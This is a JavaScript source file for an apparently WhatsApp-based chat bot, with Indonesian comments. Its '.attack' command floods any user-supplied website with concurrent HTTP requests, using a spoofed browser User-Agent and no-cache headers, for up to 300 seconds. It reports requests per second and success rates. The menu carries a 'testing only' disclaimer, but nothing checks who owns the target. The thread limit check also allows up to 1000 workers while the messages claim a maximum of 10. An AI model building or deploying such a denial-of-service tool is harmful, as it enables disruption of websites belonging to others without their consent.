import fs from 'fs-extra';
import axios from 'axios';
import chalk from 'chalk';

// Logger dengan design premium
class Logger {
    log(level, message, data = null) {
        const timestamp = new Date().toLocaleTimeString('id-ID');
        const colors = {
            error: chalk.red,
            warn: chalk.yellow,
            info: chalk.blue,
            success: chalk.green,
            debug: chalk.gray
        };

        const emoji = {
            error: '❌',
            warn: '⚠️',
            info: 'ℹ️',
            success: '✅',
            debug: '🔍'
        };

        const logEntry = `${emoji[level]} ${colors[level](`[${timestamp}] ${message}`)}`;
        console.log(logEntry);

        if (data) {
            console.log(chalk.gray('   ↳ Details:'), data);
        }

        // Simpan ke file log
        try {
            fs.ensureDirSync('./logs');
            fs.appendFileSync('./logs/bot.log', JSON.stringify({
                timestamp: new Date().toISOString(),
                level,
                message,
                data
            }) + '\n');
        } catch (error) {
            console.log(chalk.red('❌ Error writing to log file:'), error.message);
        }
    }

    error(message, error = null) {
        this.log('error', message, error);
    }

    info(message, data = null) {
        this.log('info', message, data);
    }

    success(message, data = null) {
        this.log('success', message, data);
    }

    warn(message, data = null) {
        this.log('warn', message, data);
    }

    debug(message, data = null) {
        this.log('debug', message, data);
    }
}

const logger = new Logger();

// Kelas Attack Manager Premium
class AttackManager {
    constructor() {
        this.attacks = new Map();
        this.requestCount = 0;
        this.isActive = true;
        logger.success('Attack Manager initialized successfully');
    }

    validateUrl(url) {
        try {
            if (!url || typeof url !== 'string') {
                throw new Error('Invalid URL format');
            }

            let processedUrl = url;
            if (!processedUrl.startsWith('http')) {
                processedUrl = 'http://' + processedUrl;
            }
            
            new URL(processedUrl);
            return true;
        } catch (error) {
            logger.warn('URL validation failed', { url, error: error.message });
            return false;
        }
    }

    async makeRequest(url, method = 'GET', timeout = 10000) {
        if (!this.validateUrl(url)) {
            return { 
                success: false, 
                error: 'Invalid URL format. Use: example.com or https://example.com'
            };
        }

        let targetUrl = url;
        if (!targetUrl.startsWith('http')) {
            targetUrl = 'http://' + targetUrl;
        }

        try {
            const startTime = Date.now();
            const response = await axios({
                method: method.toLowerCase(),
                url: targetUrl,
                timeout: timeout,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                validateStatus: () => true
            });
            
            const endTime = Date.now();
            const responseTime = endTime - startTime;

            this.requestCount++;

            return {
                success: true,
                status: response.status,
                responseTime: responseTime,
                data: response.data
            };
        } catch (error) {
            this.requestCount++;
            
            return {
                success: false,
                error: error.message,
                status: error.response?.status || 0,
                details: 'Request timeout or network issue'
            };
        }
    }

    async startAttack(targetUrl, durationMs, threads = 3, method = 'GET') {
        try {
            if (!this.validateUrl(targetUrl)) {
                throw new Error('Invalid URL format');
            }

            const attackId = Date.now().toString();
            logger.info(`🚀 Starting attack campaign`, { 
                attackId, 
                target: targetUrl, 
                duration: `${durationMs / 1000}s`,
                threads 
            });

            const attackInfo = {
                target: targetUrl,
                method: method,
                startTime: Date.now(),
                endTime: Date.now() + durationMs,
                requests: 0,
                successful: 0,
                failed: 0,
                active: true,
                threads: threads
            };

            this.attacks.set(attackId, attackInfo);

            const makeRequests = async (workerId) => {
                while (this.isActive && attackInfo.active && Date.now() < attackInfo.endTime) {
                    try {
                        const result = await this.makeRequest(targetUrl, method);
                        attackInfo.requests++;
                        
                        if (result.success) {
                            attackInfo.successful++;
                        } else {
                            attackInfo.failed++;
                        }
                        
                        if (attackInfo.requests % 100 === 0) {
                            const elapsed = (Date.now() - attackInfo.startTime) / 1000;
                            const rps = (attackInfo.requests / elapsed).toFixed(2);
                            logger.debug(`📊 Attack progress`, { 
                                attackId, 
                                requests: attackInfo.requests,
                                rps 
                            });
                        }
                        
                        await new Promise(resolve => setTimeout(resolve, 50));
                    } catch (error) {
                        attackInfo.failed++;
                    }
                }
            };

            const promises = [];
            for (let i = 0; i < threads; i++) {
                promises.push(makeRequests(i));
            }

            Promise.all(promises).then(() => {
                if (attackInfo.active) {
                    attackInfo.active = false;
                    const totalTime = (Date.now() - attackInfo.startTime) / 1000;

                    const result = {
                        attackId: attackId,
                        target: targetUrl,
                        totalRequests: attackInfo.requests,
                        successful: attackInfo.successful,
                        failed: attackInfo.failed,
                        duration: totalTime,
                        rps: (attackInfo.requests / totalTime).toFixed(2),
                        successRate: attackInfo.requests > 0 ? 
                            ((attackInfo.successful / attackInfo.requests) * 100).toFixed(2) : '0.00'
                    };

                    logger.success(`🎯 Attack completed successfully`, result);
                    this.attacks.delete(attackId);
                }
            }).catch(error => {
                logger.error(`💥 Attack failed`, { attackId, error: error.message });
                attackInfo.active = false;
                this.attacks.delete(attackId);
            });

            return attackId;

        } catch (error) {
            logger.error('❌ Failed to start attack campaign', error);
            throw error;
        }
    }

    getActiveAttacks() {
        const activeAttacks = [];
        for (const [id, attack] of this.attacks) {
            if (attack.active) {
                const now = Date.now();
                const elapsed = Math.floor((now - attack.startTime) / 1000);
                const remaining = Math.max(0, Math.floor((attack.endTime - now) / 1000));
                
                activeAttacks.push({
                    id,
                    target: attack.target,
                    elapsed,
                    remaining,
                    requests: attack.requests,
                    successful: attack.successful,
                    failed: attack.failed,
                    threads: attack.threads
                });
            }
        }
        return activeAttacks;
    }

    stopAllAttacks() {
        let stopped = 0;
        for (const [id, attack] of this.attacks) {
            if (attack.active) {
                attack.active = false;
                stopped++;
                logger.info(`🛑 Attack stopped`, { attackId: id });
            }
        }
        this.attacks.clear();
        logger.success(`✅ All attacks terminated`, { stopped });
        return stopped;
    }

    getTotalRequests() {
        return this.requestCount;
    }

    cleanup() {
        this.isActive = false;
        this.stopAllAttacks();
        logger.info('🧹 Attack manager cleaned up');
    }
}

// Command Handler Premium
class CommandHandler {
    constructor(sock) {
        this.sock = sock;
        this.attackManager = new AttackManager();
        this.commands = new Map();
        this.setupCommands();
        logger.success('Command Handler initialized successfully');
    }

    setupCommands() {
        // Command .menu
        this.commands.set('menu', {
            description: 'Menampilkan menu bot premium',
            usage: '.menu',
            handler: async (message, args, sender) => {
                try {
                    const menuText = this.createMenuText();
                    await this.sendMessage(sender, menuText);
                    logger.success('📋 Menu displayed successfully');
                } catch (error) {
                    logger.error('❌ Error displaying menu', error);
                    await this.sendMessage(sender, '❌ Error menampilkan menu');
                }
            }
        });

        // Command .attack
        this.commands.set('attack', {
            description: 'Melakukan attack ke target website',
            usage: '.attack <url> <duration_in_seconds> <threads>',
            handler: async (message, args, sender) => {
                try {
                    if (args.length < 2) {
                        const helpText = this.createAttackHelpText();
                        await this.sendMessage(sender, helpText);
                        return;
                    }

                    let url = args[0];
                    const duration = parseInt(args[1]) * 1000;
                    const threads = args[2] ? parseInt(args[2]) : 3;

                    // Validasi
                    if (isNaN(duration) || duration <= 0) {
                        await this.sendMessage(sender, '❌ Durasi harus angka positif!');
                        return;
                    }

                    if (duration > 300000) {
                        await this.sendMessage(sender, '❌ Durasi maksimal 300 detik!');
                        return;
                    }

                    if (threads < 1 || threads > 1000 || isNaN(threads)) {
                        await this.sendMessage(sender, '❌ Threads harus 1-10!');
                        return;
                    }

                    const attackMessage = this.createAttackStartMessage(url, args[1], threads);
                    await this.sendMessage(sender, attackMessage);

                    // Start attack
                    const attackId = await this.attackManager.startAttack(url, duration, threads);
                    
                    // Progress update
                    setTimeout(async () => {
                        const activeAttacks = this.attackManager.getActiveAttacks();
                        const currentAttack = activeAttacks.find(a => a.id === attackId);
                        
                        if (currentAttack) {
                            const progressText = this.createProgressText(currentAttack);
                            await this.sendMessage(sender, progressText);
                        }
                    }, 5000);

                    logger.success(`⚡ Attack started`, { attackId, url, duration, threads });

                } catch (error) {
                    logger.error('💥 Attack command failed', error);
                    const errorText = this.createErrorText(error);
                    await this.sendMessage(sender, errorText);
                }
            }
        });

        // Command .stopattack
        this.commands.set('stopattack', {
            description: 'Menghentikan semua attack yang berjalan',
            usage: '.stopattack',
            handler: async (message, args, sender) => {
                try {
                    const stopped = this.attackManager.stopAllAttacks();
                    const stopText = this.createStopText(stopped);
                    await this.sendMessage(sender, stopText);
                    logger.success('🛑 All attacks stopped');
                } catch (error) {
                    logger.error('❌ Stop attack failed', error);
                    await this.sendMessage(sender, '❌ Error menghentikan attack');
                }
            }
        });
    }

    createMenuText() {
        return `
╭───✨ *PREMIUM BOT MENU* ✨───
│
│ 🔧 *AVAILABLE COMMANDS:*
│ ◈ .menu - Show this menu
│ ◈ .attack <url> <sec> <threads> - Start attack
│ ◈ .stopattack - Stop all attacks
│
│ ⚡ *ATTACK FEATURES:*
│ ◈ Multi-thread requests
│ ◈ Real-time monitoring
│ ◈ Auto timeout protection
│
│ ⚠️ *DISCLAIMER:*
│ ◈ Use responsibly for testing only
│ ◈ Max duration: 300 seconds
│ ◈ Max threads: 10
│
╰───────────────────────────⪨
        `;
    }

    createAttackHelpText() {
        return `
╭───❌ *INVALID FORMAT* ❌───
│
│ 📋 *CORRECT USAGE:*
│ ◈ .attack <url> <seconds> <threads>
│
│ 🎯 *EXAMPLES:*
│ ◈ .attack example.com 60 5
│ ◈ .attack https://site.com 30 3
│
│ ⚙️ *PARAMETERS:*
│ ◈ URL: website target
│ ◈ Seconds: duration (1-300)
│ ◈ Threads: concurrent requests (1-10)
│
╰─────────────────────────⪨
        `;
    }

    createAttackStartMessage(url, duration, threads) {
        return `
╭───⚡ *ATTACK LAUNCHED* ⚡───
│
│ 🎯 *TARGET:* ${url}
│ ⏱️ *DURATION:* ${duration} seconds
│ 🔢 *THREADS:* ${threads}
│ 🚀 *STATUS:* Initializing...
│
│ ⏳ Please wait while we deploy
│ the attack campaign...
│
╰─────────────────────────⪨
        `;
    }

    createProgressText(attack) {
        return `
╭───📊 *ATTACK PROGRESS* 📊───
│
│ 🎯 *TARGET:* ${attack.target}
│ 📡 *REQUESTS:* ${attack.requests}
│ ✅ *SUCCESS:* ${attack.successful}
│ ❌ *FAILED:* ${attack.failed}
│ ⏱️ *ELAPSED:* ${attack.elapsed}s
│ ⏳ *REMAINING:* ${attack.remaining}s
│ 🔢 *THREADS:* ${attack.threads}
│
│ 🚀 Campaign is running...
│
╰──────────────────────────⪨
        `;
    }

    createStopText(stopped) {
        return `
╭───🛑 *ATTACK TERMINATED* 🛑───
│
│ ✅ *STOPPED:* ${stopped} attacks
│ 📊 *TOTAL REQUESTS:* ${this.attackManager.getTotalRequests().toLocaleString()}
│ 🎯 *STATUS:* All operations halted
│
│ 🔄 Use .attack to start new campaign
│
╰─────────────────────────────⪨
        `;
    }

    createErrorText(error) {
        return `
╭───💥 *COMMAND ERROR* 💥───
│
│ ❌ *ERROR:* ${error.message}
│ 🔧 *TROUBLESHOOTING:*
│ ◈ Check URL format
│ ◈ Verify internet connection
│ ◈ Try different target
│
│ 🆘 *SUPPORT:*
│ ◈ Use .menu for help
│ ◈ Ensure valid parameters
│
╰─────────────────────────⪨
        `;
    }

    async handleCommand(message) {
        try {
            let text = '';
            const msg = message.message;
            
            if (msg.conversation) {
                text = msg.conversation;
            } else if (msg.extendedTextMessage && msg.extendedTextMessage.text) {
                text = msg.extendedTextMessage.text;
            }
            
            if (!text || !text.startsWith('.')) {
                return false;
            }

            const args = text.slice(1).trim().split(/ +/);
            const commandName = args.shift().toLowerCase();
            const sender = message.key.remoteJid;

            logger.info(`📩 Command received: .${commandName}`, { sender });

            if (this.commands.has(commandName)) {
                try {
                    const command = this.commands.get(commandName);
                    await command.handler(message, args, sender);
                    logger.success(`👍 Command executed: .${commandName}`);
                    return true;
                } catch (error) {
                    logger.error(`❌ Command execution failed: .${commandName}`, error);
                    await this.sendMessage(sender, 
                        `❌ *EXECUTION ERROR*\nCommand: .${commandName}\nError: ${error.message}`
                    );
                    return true;
                }
            }

            await this.sendMessage(sender, 
                `❌ *UNKNOWN COMMAND*\nCommand: .${commandName}\nUse .menu for available commands`
            );
            return true;

        } catch (error) {
            logger.error('💥 Command handling failed', error);
            return false;
        }
    }

    async sendMessage(jid, text, log = true) {
        try {
            await this.sock.sendMessage(jid, { text: text });
            if (log) {
                logger.debug('📤 Message sent', { to: jid, length: text.length });
            }
            return true;
        } catch (error) {
            logger.error('❌ Message sending failed', { to: jid, error: error.message });
            return false;
        }
    }

    stopAllAttacks() {
        try {
            this.attackManager.stopAllAttacks();
        } catch (error) {
            logger.error('❌ Error stopping attacks', error);
        }
    }

    cleanup() {
        try {
            this.attackManager.cleanup();
            logger.info('🧹 Command handler cleaned up');
        } catch (error) {
            logger.error('❌ Cleanup failed', error);
        }
    }
}

export default CommandHandler;